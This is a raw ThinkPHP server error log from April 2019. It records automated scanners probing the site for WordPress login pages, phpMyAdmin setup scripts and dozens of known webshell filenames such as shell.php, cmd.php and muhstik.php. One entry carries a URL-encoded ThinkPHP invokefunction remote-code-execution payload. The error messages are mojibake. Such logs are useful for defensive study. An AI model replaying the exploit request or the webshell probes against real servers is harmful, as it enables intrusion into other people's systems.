[ 2019-04-06T02:25:29+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cache

[ 2019-04-06T04:54:43+08:00 ] 216.245.197.254 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000096s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Robots

[ 2019-04-06T06:27:32+08:00 ] 206.189.122.188 /wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp-login

[ 2019-04-06T06:43:10+08:00 ] 52.231.156.213 /wp/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp

[ 2019-04-06T06:52:24+08:00 ] 207.38.86.12 /wp1/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp1

[ 2019-04-06T07:02:21+08:00 ] 142.93.11.6 /wordpress/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000095s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wordpress

[ 2019-04-06T07:11:50+08:00 ] 144.217.13.219 /wordpress1/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000132s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wordpress1

[ 2019-04-06T07:21:50+08:00 ] 128.199.173.234 /wordpress2/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wordpress2

[ 2019-04-06T07:31:14+08:00 ] 35.239.61.237 /wordpress3/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wordpress3

[ 2019-04-06T07:40:45+08:00 ] 51.38.98.201 /blog/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000102s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Blog

[ 2019-04-06T07:50:52+08:00 ] 139.59.37.191 /news/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:News

[ 2019-04-06T08:00:48+08:00 ] 185.104.106.72 /site/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Site

[ 2019-04-06T08:11:19+08:00 ] 167.86.88.155 /forum/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Forum

[ 2019-04-06T08:21:27+08:00 ] 46.101.210.147 /shop/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Shop

[ 2019-04-06T08:31:58+08:00 ] 178.128.115.78 /blog2/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Blog2

[ 2019-04-06T08:41:50+08:00 ] 188.117.159.110 /blog3/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Blog3

[ 2019-04-06T08:52:18+08:00 ] 139.59.39.173 /test/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Test

[ 2019-04-06T09:02:26+08:00 ] 82.27.21.9 /demo/wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000102s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Demo

[ 2019-04-06T09:23:14+08:00 ] 104.155.143.202 /wp-login.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000093s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp-login

[ 2019-04-06T10:10:29+08:00 ] 218.30.103.17 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Robots

[ 2019-04-06T10:10:57+08:00 ] 111.202.101.103 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Robots

[ 2019-04-06T11:37:46+08:00 ] 118.24.122.13 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Robots

[ 2019-04-06T11:37:46+08:00 ] 118.24.122.13 /App0fe7c3cb.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000169s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:App0fe7c3cb

[ 2019-04-06T11:37:46+08:00 ] 118.24.122.13 /webdav/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000077s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Webdav

[ 2019-04-06T11:37:46+08:00 ] 118.24.122.13 /help.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Help

[ 2019-04-06T11:37:46+08:00 ] 118.24.122.13 /java.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Java

[ 2019-04-06T11:37:46+08:00 ] 118.24.122.13 /_query.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:_query

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /db_cts.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000093s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Db_cts

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /db_pma.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000096s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Db_pma

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /logon.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Logon

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /help-e.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Help-e

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /license.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:License

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /log.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Log

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /hell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Hell

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /pmd_online.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Pmd_online

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /x.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:X

[ 2019-04-06T11:37:50+08:00 ] 118.24.122.13 /shell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Shell

[ 2019-04-06T11:37:51+08:00 ] 118.24.122.13 /htdocs.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Htdocs

[ 2019-04-06T11:37:51+08:00 ] 118.24.122.13 /desktop.ini.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Desktop.ini

[ 2019-04-06T11:37:51+08:00 ] 118.24.122.13 /z.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Z

[ 2019-04-06T11:37:52+08:00 ] 118.24.122.13 /lala.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lala

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /lala-dpr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000096s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lala-dpr

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /wpc.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000088s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wpc

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /wpo.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000088s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wpo

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /t6nv.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000074s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:T6nv

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /muhstik.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Muhstik

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /text.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Text

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /wp-config.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp-config

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /muhstik.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Muhstik

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /muhstik2.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Muhstik2

[ 2019-04-06T11:37:54+08:00 ] 118.24.122.13 /muhstiks.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Muhstiks

[ 2019-04-06T11:37:55+08:00 ] 118.24.122.13 /muhstik-dpr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Muhstik-dpr

[ 2019-04-06T11:37:55+08:00 ] 118.24.122.13 /lol.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lol

[ 2019-04-06T11:37:55+08:00 ] 118.24.122.13 /uploader.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Uploader

[ 2019-04-06T11:37:55+08:00 ] 118.24.122.13 /cmd.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cmd

[ 2019-04-06T11:37:55+08:00 ] 118.24.122.13 /cmv.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cmv

[ 2019-04-06T11:37:55+08:00 ] 118.24.122.13 /cmdd.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cmdd

[ 2019-04-06T11:37:55+08:00 ] 118.24.122.13 /knal.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Knal

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /shell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Shell

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /appserv.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Appserv

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Scripts

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /phpmyadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Phpmyadmin

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpMyAdmin

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /phpmyadmin/scripts/db___.init.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000089s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Phpmyadmin

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /phpMyAdmin/scripts/db___.init.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000122s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpMyAdmin

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /plugins/weathermap/editor.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000090s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Plugins

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /cacti/plugins/weathermap/editor.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cacti

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50АЦШ
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000099s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Index

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /d7.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:D7

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /rxr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Rxr

[ 2019-04-06T11:37:58+08:00 ] 118.24.122.13 /1x.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:1x

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /undx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Undx

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /spider.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Spider

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /payload.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Payload

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /composers.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Composers

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /izom.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Izom

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /composer.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Composer

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /hue2.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000089s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Hue2

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /Drupal.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000105s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Drupal

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /lang.php?f=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lang

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /izom.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
INFO: [ app_init ] --END-- [ RunTime:0.000140s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Izom

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /payload.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Payload

[ 2019-04-06T11:38:02+08:00 ] 118.24.122.13 /new_license.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:New_license

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /images/vuln.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000094s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Images

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /wuwu11.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wuwu11

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /xw.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xw

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /xw1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000074s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xw1

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /9678.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:9678

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /wc.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wc

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /xx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000077s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xx

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /s.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:S

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /w.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000095s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:W

[ 2019-04-06T11:38:06+08:00 ] 118.24.122.13 /sheep.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Sheep

[ 2019-04-06T11:38:07+08:00 ] 118.24.122.13 /qaq.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qaq

[ 2019-04-06T11:38:07+08:00 ] 118.24.122.13 /db.init.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Db.init

[ 2019-04-06T11:38:07+08:00 ] 118.24.122.13 /db_session.init.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Db_session.init

[ 2019-04-06T11:38:07+08:00 ] 118.24.122.13 /db__.init.php
INFO: [ app_init ] --START--
